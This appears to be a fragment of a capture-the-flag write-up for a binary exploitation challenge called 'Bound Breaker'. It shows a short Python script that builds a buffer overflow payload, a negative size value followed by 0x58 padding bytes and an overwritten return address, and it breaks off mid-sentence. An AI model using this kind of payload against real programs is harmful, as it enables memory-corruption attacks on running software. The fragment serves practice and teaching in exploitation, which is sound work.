![](./Bound%20Breaker-1778742247503.webp)

```
#!/usr/bin/python3
import sys
sz=-1
payload=b"A"*0x58 
payload+=b"\xd1\x1b\x40"
sys.stdout.buffer.write(str(sz).encode() + b"\n" + payload)
```
the program gave us all the address we need, the only problem is that we cant really reach 